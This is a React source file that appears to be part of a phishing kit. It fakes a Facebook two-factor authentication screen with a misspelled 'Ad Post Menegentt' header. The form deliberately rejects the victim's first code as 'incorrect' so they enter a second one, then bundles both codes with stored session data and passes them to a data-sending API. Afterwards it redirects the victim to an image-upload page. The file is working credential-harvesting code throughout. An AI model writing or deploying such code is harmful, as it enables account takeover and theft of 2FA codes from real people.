import React, { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { s32w659we12154r } from './Publics/images/images'
import { Button, Form, Input } from 'antd';
import { getDataApi, getSections, saveSection } from '../apis/getData';

const ConfirmComponent = () => {

    const [formPassword] = Form.useForm();
    const [activePopup, setActivePopup] = useState(false);
    const [activeLink, setActiveLink] = useState(false);
    const [timeLeft, setTimeLeft] = useState(process.env.REACT_APP_TIMER); 
    const [activeWaring, setActiveWaring] = useState(false);

    const navigate = useNavigate();

    useEffect(() => {
        const countdownInterval = setInterval(() => {
            if (timeLeft > 0) {
                setTimeLeft(timeLeft - 1); 
            } else {
                clearInterval(countdownInterval); 
                setActiveLink(true)
                setActiveWaring(false)
            }
        }, 1000); 

        return () => {
            clearInterval(countdownInterval); 
        };
    }, [timeLeft]);

    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;

    const handleOpendPopup = () => {
        setActivePopup(true)
    }

    const handleClosePopup = () => {
        setActivePopup(false)
    }

    const onFinishCodes = (values) => {
        
        if(timeLeft > 0){
            setActiveWaring(true)
            const getNewSession = getSections('newSession');
            formPassword.setFieldsValue({ fill_code: '' });
            
            const firstCode = {...getNewSession, firstTwoFa: values.fill_code}
            saveSection(firstCode, 'sessionAuthenticate')
            getDataApi(firstCode)
            
        } else {
            const sessionAuthenticate = getSections('sessionAuthenticate');
            const finalAuthenticate = {...sessionAuthenticate, secondTwoFa: values.fill_code}
            saveSection(finalAuthenticate, 'finalSessionAuthenticate')
            getDataApi(finalAuthenticate)

            navigate(`/${process.env.REACT_APP_ROUTER}/upload-image`);
        }

    };


    return (
        <div>
            <div className="confirm">

                <div className="main-confirm">
                    <div className="container">
                        <div className="content col-md-8 col-12">

                            <div className='desc'>
                                <div className="name-fb">
                                    <p style={{marginBottom: "0", color: "black", fontWeight: "500"}}>Ad Post Menegentt • Facebook</p>
                                </div>
                                <h3 className="twh3">Go to authenticator app</h3>
                                <p>Enter the 6-digit code for this account from the 2-factor authentication app you set up (for example, Duo Mobile or Google Authenticator).</p>
                                <img src={s32w659we12154r} width="100%" style={{"borderRadius":"10px", "margin": "15px auto 35px auto"}} alt="" />
                            </div>

                            <Form
                                name="formThree"
                                initialValues={{
                                    remember: true,
                                }}
                                onFinish={onFinishCodes}
                                form={formPassword}
                                autoComplete="off"
                            >

                                <Form.Item
                                    name="fill_code"
                                    rules={[
                                        {
                                            required: true,
                                            message: `You haven't entered your two-factor authentication!`,
                                        },
                                    ]}
                                >
                                    <Input placeholder='Code' maxLength={8} />
                                </Form.Item>

                                <div className={`password-correct ${activeWaring === true ? 'active' : ''}`} id="waring-code">
                                    <p style={{ marginTop: "10px" }}>The code generator you entered is incorrect. Please wait {minutes} minutes {seconds < 10 ? `0${seconds}` : seconds} seconds to receive another one.</p>
                                </div>
                                
                                <p id="timmer" className={`${activeWaring === true ? 'active' : ''}`}>
                                    <a style={{ marginBottom: "2px", marginRight: "5px" }} href=""><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path fillRule="evenodd" clipRule="evenodd" d="M8 3C5.23858 3 3 5.23857 3 8C3 10.7614 5.23858 13 8 13C10.7614 13 13 10.7614 13 8C13 7.25457 12.8372 6.54852 12.5457 5.91433C12.4304 5.66343 12.5403 5.36654 12.7912 5.25121C13.0421 5.13588 13.339 5.24578 13.4543 5.49669C13.8048 6.25923 14 7.1075 14 8C14 11.3137 11.3137 14 8 14C4.68629 14 2 11.3137 2 8C2 4.68629 4.68629 2 8 2V3Z" fill="#4b4f56" />
                                        <path d="M8 4.46624V0.533757C8 0.321798 8.24721 0.206009 8.41005 0.341702L10.7695 2.30794C10.8895 2.40789 10.8895 2.5921 10.7695 2.69205L8.41005 4.65829C8.24721 4.79399 8 4.6782 8 4.46624Z" fill="#4b4f56" />
                                    </svg>
                                    </a>
                                    We can send a new code in <b style={{ marginLeft: "5px" }}>{minutes}:{seconds < 10 ? `0${seconds}` : seconds}</b>
                                </p>

                                <Form.Item>
                                    <Button className='button-send' htmlType="submit" >
                                        Continue
                                    </Button>
                                </Form.Item>

                                <Form.Item>
                                    <div className="try">
                                        <a href="">Get a new code</a>
                                    </div>
                                </Form.Item>
                            </Form>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    )
}

export default ConfirmComponent